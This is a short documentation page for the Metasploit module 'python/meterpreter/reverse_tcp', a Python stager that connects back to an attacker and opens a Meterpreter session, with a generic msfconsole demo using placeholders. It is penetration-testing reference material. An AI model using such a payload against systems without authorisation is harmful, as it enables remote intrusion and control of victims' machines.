## Python Meterpreter, Python Reverse TCP Stager

Run a meterpreter server in Python (2.5-2.7 & 3.1-3.5). 
Connect back to the attacker


## Module Name
payload/python/meterpreter/reverse_tcp

## Authors
* Spencer McIntyre





## Platforms
* python

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/python/meterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    